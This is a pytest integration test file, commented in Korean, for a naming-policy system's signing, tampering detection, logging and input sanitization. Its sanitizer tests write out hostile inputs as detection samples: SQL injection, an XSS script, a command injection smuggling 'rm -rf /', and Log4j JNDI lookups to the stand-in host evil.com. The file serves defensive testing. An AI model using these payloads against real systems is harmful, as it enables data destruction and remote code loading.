"""
보안 강화 기능 통합 테스트
Policy Signing, Tampering Detection, Validation Logging, Input Sanitization
"""
import json
import tempfile
import time
from pathlib import Path
from datetime import datetime, timezone, timedelta

import pytest

from core.validation.naming_convention import (
    NamingConvention, NamingRule, EntityType, NamingPattern, get_naming_engine
)
from core.validation.policy_signing import (
    PolicySigner, SignatureAlgorithm, get_policy_signing_manager
)
from core.validation.tampering_detection import get_integrity_checker, TamperingAlert
from core.validation.validation_logging import get_validation_logger, ValidationOutcome
from core.validation.input_sanitization import (
    get_input_sanitizer, get_secure_processor, SanitizationLevel
)


class TestPolicySigning:
    """정책 서명 테스트"""
    
    def test_hmac_signing(self):
        """HMAC 서명 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            signer = PolicySigner(hmac_secret="test_secret_key_12345")
            
            # 테스트 정책 생성
            policy = NamingConvention(
                id="test_policy",
                name="Test Policy",
                rules={
                    EntityType.OBJECT_TYPE: NamingRule(
                        entity_type=EntityType.OBJECT_TYPE,
                        pattern=NamingPattern.PASCAL_CASE,
                        min_length=3,
                        max_length=50
                    )
                },
                created_at="2025-01-15T00:00:00Z",
                updated_at="2025-01-15T00:00:00Z",
                created_by="test"
            )
            
            # 서명
            signed_policy = signer.sign_policy(policy, SignatureAlgorithm.HMAC_SHA256, "test_user")
            
            assert signed_policy.signature.algorithm == SignatureAlgorithm.HMAC_SHA256
            assert signed_policy.signature.signer == "test_user"
            assert signed_policy.signature.signature
            assert signed_policy.integrity_hash
            
            # 검증
            assert signer.verify_policy(signed_policy)
            
            # 무결성 확인
            assert signed_policy.verify_integrity()
    
    def test_rsa_signing(self):
        """RSA 서명 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            # 키 생성
            signer = PolicySigner()
            private_pem, public_pem = signer.generate_rsa_keypair()
            
            # 키 저장
            private_key_path = Path(temp_dir) / "private.pem"
            public_key_path = Path(temp_dir) / "public.pem"
            
            with open(private_key_path, 'w') as f:
                f.write(private_pem)
            with open(public_key_path, 'w') as f:
                f.write(public_pem)
            
            # 서명자 초기화
            signer = PolicySigner(
                private_key_path=str(private_key_path),
                public_key_path=str(public_key_path),
                key_id="test_key"
            )
            
            # 테스트 정책
            policy = NamingConvention(
                id="rsa_test",
                name="RSA Test Policy",
                rules={},
                created_at="2025-01-15T00:00:00Z",
                updated_at="2025-01-15T00:00:00Z",
                created_by="test"
            )
            
            # RSA-PSS 서명
            signed_policy = signer.sign_policy(policy, SignatureAlgorithm.RSA_PSS_SHA256, "rsa_user")
            
            assert signed_policy.signature.algorithm == SignatureAlgorithm.RSA_PSS_SHA256
            assert signed_policy.signature.key_id == "test_key"
            
            # 검증
            assert signer.verify_policy(signed_policy)
    
    def test_signature_tampering_detection(self):
        """서명 변조 감지 테스트"""
        signer = PolicySigner(hmac_secret="secret123")
        
        policy = NamingConvention(
            id="tamper_test",
            name="Tamper Test",
            rules={},
            created_at="2025-01-15T00:00:00Z",
            updated_at="2025-01-15T00:00:00Z",
            created_by="test"
        )
        
        signed_policy = signer.sign_policy(policy, SignatureAlgorithm.HMAC_SHA256, "user")
        
        # 정상 검증
        assert signer.verify_policy(signed_policy)
        
        # 정책 내용 변조
        signed_policy.policy.name = "Modified Name"
        assert not signed_policy.verify_integrity()
        assert not signer.verify_policy(signed_policy)


class TestTamperingDetection:
    """변조 감지 테스트"""
    
    def test_snapshot_creation(self):
        """스냅샷 생성 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            checker = get_integrity_checker(temp_dir)
            
            policy = NamingConvention(
                id="snapshot_test",
                name="Snapshot Test",
                rules={},
                created_at="2025-01-15T00:00:00Z",
                updated_at="2025-01-15T00:00:00Z",
                created_by="test"
            )
            
            snapshot = checker.create_snapshot(policy)
            
            assert snapshot.policy_id == "snapshot_test"
            assert snapshot.content_hash
            assert snapshot.metadata_hash
            assert snapshot.snapshot_hash
    
    def test_integrity_check(self):
        """무결성 검사 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            checker = get_integrity_checker(temp_dir)
            
            policy = NamingConvention(
                id="integrity_test",
                name="Original Name",
                rules={},
                created_at="2025-01-15T00:00:00Z",
                updated_at="2025-01-15T00:00:00Z",
                created_by="test"
            )
            
            # 첫 번째 검사 - 스냅샷 생성
            is_valid, events = checker.check_integrity(policy)
            assert is_valid
            assert len(events) == 0
            
            # 정책 수정
            policy.name = "Modified Name"
            policy.updated_at = "2025-01-15T01:00:00Z"
            
            # 두 번째 검사 - 변조 감지
            is_valid, events = checker.check_integrity(policy)
            assert len(events) > 0
            
            # 내용 변경 이벤트 확인
            content_events = [e for e in events if e.event_type == "content_modified"]
            assert len(content_events) > 0
            assert content_events[0].alert_level == TamperingAlert.WARNING
    
    def test_signed_policy_tampering(self):
        """서명된 정책 변조 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            checker = get_integrity_checker(temp_dir)
            signer = PolicySigner(hmac_secret="test_secret")
            
            policy = NamingConvention(
                id="signed_test",
                name="Signed Test",
                rules={},
                created_at="2025-01-15T00:00:00Z",
                updated_at="2025-01-15T00:00:00Z",
                created_by="test"
            )
            
            signed_policy = signer.sign_policy(policy, SignatureAlgorithm.HMAC_SHA256, "user")
            
            # 정상 검사
            is_valid, events = checker.check_integrity(policy, signed_policy=signed_policy)
            assert is_valid
            
            # 서명 변조
            signed_policy.signature.signature = "invalid_signature"
            
            # 변조된 서명 검사
            is_valid, events = checker.check_integrity(policy, signed_policy=signed_policy)
            assert not is_valid
            
            # 서명 검증 실패 이벤트 확인
            sig_events = [e for e in events if e.event_type == "signature_verification_failed"]
            assert len(sig_events) > 0
            assert sig_events[0].alert_level == TamperingAlert.CRITICAL


class TestValidationLogging:
    """검증 로깅 테스트"""
    
    def test_basic_logging(self):
        """기본 로깅 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            logger = get_validation_logger(temp_dir)
            engine = get_naming_engine()
            
            # 성공 케이스
            result = engine.validate(EntityType.OBJECT_TYPE, "ValidName")
            log_entry = logger.log_validation(
                EntityType.OBJECT_TYPE,
                "ValidName",
                result,
                "default",
                user_id="test_user",
                validation_time_ms=1.5
            )
            
            assert log_entry.entity_type == EntityType.OBJECT_TYPE
            assert log_entry.entity_name == "ValidName"
            assert log_entry.outcome == ValidationOutcome.SUCCESS
            assert log_entry.is_valid == True
            assert log_entry.user_id == "test_user"
            assert log_entry.validation_time_ms == 1.5
            
            # 실패 케이스
            result = engine.validate(EntityType.OBJECT_TYPE, "invalid_name")
            log_entry = logger.log_validation(
                EntityType.OBJECT_TYPE,
                "invalid_name",
                result,
                "default"
            )
            
            assert log_entry.outcome == ValidationOutcome.FAILURE
            assert log_entry.is_valid == False
            assert len(log_entry.issues) > 0
    
    def test_metrics_collection(self):
        """메트릭 수집 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            logger = get_validation_logger(temp_dir)
            engine = get_naming_engine()
            
            # 여러 검증 실행
            test_cases = [
                ("ValidName1", True),
                ("ValidName2", True),
                ("invalid_name", False),
                ("another_invalid", False),
            ]
            
            for name, should_be_valid in test_cases:
                result = engine.validate(EntityType.OBJECT_TYPE, name)
                logger.log_validation(EntityType.OBJECT_TYPE, name, result, "default")
            
            # 메트릭 확인
            metrics = logger.get_metrics()
            assert metrics.total_validations == 4
            assert metrics.successful_validations == 2
            assert metrics.failed_validations == 2
            
            # 엔티티 타입별 통계 확인
            assert "objectType" in metrics.by_entity_type
            type_stats = metrics.by_entity_type["objectType"]
            assert type_stats["total"] == 4
            assert type_stats["success"] == 2
            assert type_stats["failure"] == 2
    
    def test_event_streaming(self):
        """이벤트 스트리밍 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            logger = get_validation_logger(temp_dir, enable_stream=True)
            engine = get_naming_engine()
            
            # 검증 실행
            result = engine.validate(EntityType.PROPERTY, "testProperty")
            logger.log_validation(EntityType.PROPERTY, "testProperty", result, "default")
            
            # 전체 스트림 확인
            global_stream = logger.get_event_stream("global")
            assert global_stream is not None
            assert len(global_stream.events) == 1
            
            # 엔티티별 스트림 확인
            entity_stream = logger.get_event_stream("entity_property")
            assert entity_stream is not None
            assert len(entity_stream.events) == 1


class TestInputSanitization:
    """입력 정제 테스트"""
    
    def test_basic_sanitization(self):
        """기본 정제 테스트"""
        sanitizer = get_input_sanitizer(SanitizationLevel.BASIC)
        
        # 널 바이트 제거
        result = sanitizer.sanitize("test\x00name")
        assert result.sanitized_value == "testname"
        assert result.was_modified == True
        assert "null_bytes" in result.detected_threats
        
        # 제어 문자 제거
        result = sanitizer.sanitize("test\x01\x02name")
        assert result.sanitized_value == "testname"
        assert "control_chars" in result.detected_threats
    
    def test_injection_prevention(self):
        """인젝션 방지 테스트"""
        sanitizer = get_input_sanitizer(SanitizationLevel.STRICT)
        
        # SQL 인젝션
        result = sanitizer.sanitize("'; DROP TABLE users; --")
        assert "sql_injection" in result.detected_threats
        assert result.risk_score > 30
        
        # XSS
        result = sanitizer.sanitize("<script>alert('xss')</script>")
        assert "xss_scripts" in result.detected_threats
        
        # Command injection
        result = sanitizer.sanitize("test$(rm -rf /)")
        assert "command_injection" in result.detected_threats
        
        # Log4j injection
        result = sanitizer.sanitize("${jndi:ldap://evil.com/a}")
        assert "log4j_injection" in result.detected_threats
    
    def test_unicode_handling(self):
        """유니코드 처리 테스트"""
        sanitizer = get_input_sanitizer(SanitizationLevel.PARANOID)
        
        # 정상 유니코드
        result = sanitizer.sanitize("test유니코드", allow_unicode=True)
        assert result.sanitized_value == "test유니코드"
        
        # Zero-width 문자
        result = sanitizer.sanitize("test\u200bname")
        assert "\u200b" not in result.sanitized_value
        assert "unicode_exploitation" in result.detected_threats
        
        # 호모그래프 공격
        result = sanitizer.sanitize("tеst")  # 키릴 문자 'е'
        assert result.sanitized_value == "test"  # 라틴 문자 'e'로 변환
    
    def test_secure_entity_processing(self):
        """안전한 엔티티 처리 테스트"""
        processor = get_secure_processor()
        
        # 정상 케이스
        name, modified, issues = processor.process_entity_name("ValidName")
        assert name == "ValidName"
        assert not modified
        assert len(issues) == 0
        
        # 보안 위협 포함
        name, modified, issues = processor.process_entity_name("test'; DROP TABLE users;")
        assert modified
        assert len(issues) > 0
        assert any("Security:" in issue for issue in issues)
        
        # 자동 수정
        name, modified, issues = processor.process_entity_name("123invalid-name", auto_fix=True)
        assert name == "invalidname"  # 숫자와 하이픈 제거, 문자로 시작
        assert modified
    
    def test_naming_validation(self):
        """명명 규칙 검증 테스트"""
        sanitizer = get_input_sanitizer()
        
        # 유효한 이름
        is_valid, issues = sanitizer.validate_naming_input("ValidEntityName")
        assert is_valid
        assert len(issues) == 0
        
        # 빈 값
        is_valid, issues = sanitizer.validate_naming_input("")
        assert not is_valid
        assert "Empty value not allowed" in issues
        
        # 숫자로 시작
        is_valid, issues = sanitizer.validate_naming_input("123Name")
        assert not is_valid
        assert "Must start with a letter" in issues
        
        # 너무 긴 이름
        long_name = "a" * 300
        is_valid, issues = sanitizer.validate_naming_input(long_name)
        assert not is_valid
        assert "Value too long" in issues
        
        # 예약어
        is_valid, issues = sanitizer.validate_naming_input("con")
        assert not is_valid
        assert "Reserved word" in issues[0]


class TestSecurityIntegration:
    """보안 기능 통합 테스트"""
    
    def test_end_to_end_security_workflow(self):
        """종단간 보안 워크플로우 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            # 컴포넌트 초기화
            signing_manager = get_policy_signing_manager(temp_dir + "/signing")
            integrity_checker = get_integrity_checker(temp_dir + "/snapshots")
            validation_logger = get_validation_logger(temp_dir + "/logs")
            secure_processor = get_secure_processor()
            
            # 1. 입력 정제
            raw_input = "test'; DROP TABLE users; --Entity"
            clean_name, was_modified, issues = secure_processor.process_entity_name(
                raw_input, auto_fix=True
            )
            assert was_modified
            assert len(issues) > 0
            
            # 2. 정책 서명
            policy = NamingConvention(
                id="secure_test",
                name="Secure Test Policy",
                rules={
                    EntityType.OBJECT_TYPE: NamingRule(
                        entity_type=EntityType.OBJECT_TYPE,
                        pattern=NamingPattern.PASCAL_CASE,
                        min_length=3,
                        max_length=50
                    )
                },
                created_at="2025-01-15T00:00:00Z",
                updated_at="2025-01-15T00:00:00Z",
                created_by="security_test"
            )
            
            signed_policy = signing_manager.sign_policy(policy, "test_user")
            assert signing_manager.verify_policy(signed_policy)
            
            # 3. 무결성 검사
            is_valid, events = integrity_checker.check_integrity(
                policy, signed_policy=signed_policy
            )
            assert is_valid
            assert len(events) == 0
            
            # 4. 검증 수행 및 로깅
            engine = get_naming_engine()
            result = engine.validate(EntityType.OBJECT_TYPE, clean_name)
            
            log_entry = validation_logger.log_validation(
                EntityType.OBJECT_TYPE,
                clean_name,
                result,
                policy.id,
                user_id="security_test",
                metadata={
                    "original_input": raw_input,
                    "security_issues": issues,
                    "policy_signed": True
                }
            )
            
            assert log_entry.outcome == ValidationOutcome.SUCCESS
            assert log_entry.metadata["policy_signed"] == True
            assert len(log_entry.metadata["security_issues"]) > 0
    
    def test_security_monitoring_dashboard_data(self):
        """보안 모니터링 대시보드 데이터 테스트"""
        with tempfile.TemporaryDirectory() as temp_dir:
            validation_logger = get_validation_logger(temp_dir)
            integrity_checker = get_integrity_checker(temp_dir)
            
            # 시뮬레이션: 다양한 보안 이벤트 생성
            test_inputs = [
                ("ValidName", True, []),
                ("'; DROP TABLE", False, ["SQL injection attempt"]),
                ("<script>alert(1)</script>", False, ["XSS attempt"]),
                ("ValidName2", True, []),
                ("${jndi:ldap://evil.com}", False, ["Log4j injection"]),
            ]
            
            engine = get_naming_engine()
            
            for name, should_be_valid, security_issues in test_inputs:
                # 입력 정제
                processor = get_secure_processor()
                clean_name, was_modified, issues = processor.process_entity_name(name, auto_fix=True)
                
                # 검증 및 로깅
                result = engine.validate(EntityType.OBJECT_TYPE, clean_name)
                validation_logger.log_validation(
                    EntityType.OBJECT_TYPE,
                    clean_name,
                    result,
                    "default",
                    metadata={
                        "original_input": name,
                        "security_issues": security_issues,
                        "was_sanitized": was_modified
                    }
                )
            
            # 보안 요약 정보 생성
            metrics = validation_logger.get_metrics()
            failure_summary = validation_logger.get_failure_summary(hours=1)
            
            # 대시보드 데이터 구조 확인
            dashboard_data = {
                "total_validations": metrics.total_validations,
                "security_incidents": len([
                    log for log in validation_logger.recent_logs
                    if log.metadata.get("security_issues")
                ]),
                "sanitized_inputs": len([
                    log for log in validation_logger.recent_logs
                    if log.metadata.get("was_sanitized")
                ]),
                "failure_rate": failure_summary["failure_rate"],
                "top_threats": failure_summary["top_failure_types"]
            }
            
            assert dashboard_data["total_validations"] == 5
            assert dashboard_data["security_incidents"] >= 3  # 보안 이슈가 있는 입력들
            assert dashboard_data["sanitized_inputs"] >= 3   # 정제된 입력들
            assert isinstance(dashboard_data["failure_rate"], float)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])